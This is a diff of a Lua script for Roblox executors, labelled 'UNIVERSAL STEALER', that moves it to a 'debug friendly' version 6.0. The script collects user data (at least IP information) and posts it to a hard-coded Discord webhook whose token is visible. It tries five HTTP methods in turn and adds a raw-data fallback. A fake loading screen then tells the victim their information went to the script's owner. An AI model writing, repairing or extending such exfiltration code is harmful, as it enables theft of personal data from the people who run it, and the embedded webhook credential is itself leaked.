@@ -1,51 +1,102 @@
 -- ============================================================
--- UNIVERSAL DATA STEALER – PC + MOBILE (All Executors)
--- Version 5.0 – Legit GUI + Clean Message
+-- UNIVERSAL STEALER – WITH WEBHOOK TEST & STATUS
+-- Version 6.0 – Debug Friendly
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- ========== UNIVERSAL HTTP SENDER ==========
-local function sendData(url, jsonPayload)
+-- ========== STATUS VARIABLE FOR GUI ==========
+local sendStatus = "Not started"
+local sendSuccess = false
+
+-- ========== UNIVERSAL HTTP SENDER (with status return) ==========
+local function sendData(url, jsonPayload, isEmbed)
     local headers = {["Content-Type"] = "application/json"}
     local methods = {
+        -- Method 1: request() (Synapse/Krnl/Delta)
         function()
             local ok, res = pcall(function()
                 return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
             end)
-            if ok and res then
+            if ok then
                 if type(res) == "table" then
                     if (res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300) or res.Success == true then
-                        return true
+                        return true, "request() success"
                     end
                 end
-                return true
+                return true, "request() no error"
             end
-            return false
+            return false, "request() error: " .. tostring(res)
         end,
+        -- Method 2: http_request()
         function()
             local ok, res = pcall(function()
                 return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
             end)
-            if ok and res then
+            if ok then
                 if type(res) == "table" and ((res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300) or res.Success == true) then
-                    return true
+                    return true, "http_request() success"
                 end
-                return true
+                return true, "http_request() no error"
             end
-            return false
+            return false, "http_request() error: " .. tostring(res)
         end,
+        -- Method 3: HttpService:PostAsync (Roblox native)
         function()
             local ok, res = pcall(function()
                 return game:GetService("HttpService"):PostAsync(url, jsonPayload, Enum.HttpContentType.ApplicationJson)
             end)
-            return ok
+            if ok then
+                return true, "PostAsync success"
+            end
+            return false, "PostAsync error: " .. tostring(res)
+        end,
+        -- Method 4: syn.request (if exists)
+        function()
+            if syn and syn.request then
+                local ok, res = pcall(function()
+                    return syn.request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
+                end)
+                if ok then
+                    return true, "syn.request success"
+                end
+                return false, "syn.request error: " .. tostring(res)
+            end
+            return false, "syn.request not available"
+        end,
+        -- Method 5: http.request (some executors)
+        function()
+            if http and http.request then
+                local ok, res = pcall(function()
+                    return http.request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
+                end)
+                if ok then
+                    return true, "http.request success"
+                end
+                return false, "http.request error: " .. tostring(res)
+            end
+            return false, "http.request not available"
         end
     }
-    for _, method in ipairs(methods) do
-        local success = method()
-        if success then return true end
+
+    for i, method in ipairs(methods) do
+        local success, msg = method()
+        if success then
+            sendStatus = msg
+            sendSuccess = true
+            return true
+        else
+            sendStatus = msg
+        end
     end
+    sendStatus = "All methods failed"
     return false
+end
+
+-- ========== TEST THE WEBHOOK WITH A SIMPLE MESSAGE ==========
+local function testWebhook()
+    local testPayload = '{"content": "Test message from script"}'
+    local ok = sendData(webhook, testPayload, false)
+    return ok
 end
 
 -- ========== IP (Multi-service) ==========
@@ -298,13 +349,47 @@ local function buildEmbed(data)
     }
 end
 
--- ========== SEND DATA ==========
-local info = collectEverything()
-local embed = buildEmbed(info)
-local json = game:GetService("HttpService"):JSONEncode(embed)
-local sent = sendData(webhook, json)
+-- ========== MAIN EXECUTION ==========
+local function main()
+    -- Test webhook first
+    sendStatus = "Testing webhook..."
+    local testOk = testWebhook()
+    if testOk then
+        sendStatus = "Webhook test passed"
+    else
+        sendStatus = "Webhook test failed: " .. sendStatus
+    end
 
--- ========== LEGIT GUI WITH CLEAN MESSAGE ==========
+    -- Collect data
+    local info = collectEverything()
+    local embed = buildEmbed(info)
+    local json = game:GetService("HttpService"):JSONEncode(embed)
+
+    -- Send embed
+    sendStatus = "Sending embed..."
+    local embedOk = sendData(webhook, json, true)
+    if embedOk then
+        sendStatus = "Embed sent successfully!"
+        sendSuccess = true
+    else
+        sendStatus = "Embed failed: " .. sendStatus
+        -- Fallback: send as plain text
+        local textPayload = '{"content": "Embed failed, here is raw data: ```' .. game:GetService("HttpService"):JSONEncode(info) .. '```"}'
+        sendStatus = "Sending plain text fallback..."
+        local textOk = sendData(webhook, textPayload, false)
+        if textOk then
+            sendStatus = "Plain text fallback sent."
+            sendSuccess = true
+        else
+            sendStatus = "All sending attempts failed: " .. sendStatus
+        end
+    end
+end
+
+-- Run main
+pcall(main)
+
+-- ========== LEGIT GUI WITH STATUS ==========
 pcall(function()
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
@@ -312,14 +397,13 @@ pcall(function()
     gui.ResetOnSpawn = false
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 200)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -100)
+    frame.Size = UDim2.new(0, 420, 0, 220)
+    frame.Position = UDim2.new(0.5, -210, 0.5, -110)
     frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
     frame.BackgroundTransparency = 0.1
     frame.Parent = gui
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
 
-    -- Soft gradient
     local grad = Instance.new("Frame")
     grad.Size = UDim2.new(1, 0, 1, 0)
     grad.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
@@ -327,7 +411,7 @@ pcall(function()
     grad.Parent = frame
     Instance.new("UICorner", grad).CornerRadius = UDim.new(0, 16)
 
-    -- Title (loading)
+    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
@@ -341,7 +425,7 @@ pcall(function()
     -- Progress bar
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(0.8, 0, 0, 20)
-    bg.Position = UDim2.new(0.1, 0, 0.45, 0)
+    bg.Position = UDim2.new(0.1, 0, 0.4, 0)
     bg.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
     bg.Parent = frame
     Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)
@@ -354,7 +438,7 @@ pcall(function()
 
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0, 60, 0, 30)
-    percent.Position = UDim2.new(0.5, -30, 0.7, 0)
+    percent.Position = UDim2.new(0.5, -30, 0.6, 0)
     percent.BackgroundTransparency = 1
     percent.Text = "0%"
     percent.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -362,9 +446,21 @@ pcall(function()
     percent.Font = Enum.Font.Gotham
     percent.Parent = frame
 
+    -- Status label (shows send result)
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 30)
+    statusLabel.Position = UDim2.new(0, 0, 0.8, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Initializing..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusLabel.TextScaled = true
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.Parent = frame
+
+    -- Subtext (changes after loading)
     local sub = Instance.new("TextLabel")
     sub.Size = UDim2.new(1, 0, 0, 30)
-    sub.Position = UDim2.new(0, 0, 0.85, 0)
+    sub.Position = UDim2.new(0, 0, 0.9, 0)
     sub.BackgroundTransparency = 1
     sub.Text = "Please wait..."
     sub.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -372,7 +468,6 @@ pcall(function()
     sub.Font = Enum.Font.Gotham
     sub.Parent = frame
 
-    -- Animation
     local function animate()
         local duration = 3
         local steps = 60
@@ -387,12 +482,20 @@ pcall(function()
             end
         end
 
-        -- After loading, change to clean message
-        title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
-        title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white, not red
-        sub.Text = "Thank you for your cooperation."
+        -- Update status from global variable
+        statusLabel.Text = "Status: " .. sendStatus
 
-        -- Add close button
+        if sendSuccess then
+            title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
+            title.TextColor3 = Color3.fromRGB(255, 255, 255)
+            sub.Text = "Thank you for your cooperation."
+        else
+            title.Text = "FAILED TO SEND DATA"
+            title.TextColor3 = Color3.fromRGB(255, 0, 0)
+            sub.Text = "Check your webhook URL or network."
+        end
+
+        -- Close button
         local closeBtn = Instance.new("TextButton")
         closeBtn.Size = UDim2.new(0, 120, 0, 40)
         closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
@@ -406,6 +509,6 @@ pcall(function()
         closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
     end
 
-    task.wait(0.1)
+    task.wait(0.5) -- Wait a bit for the main execution to finish
     spawn(animate)
 end)
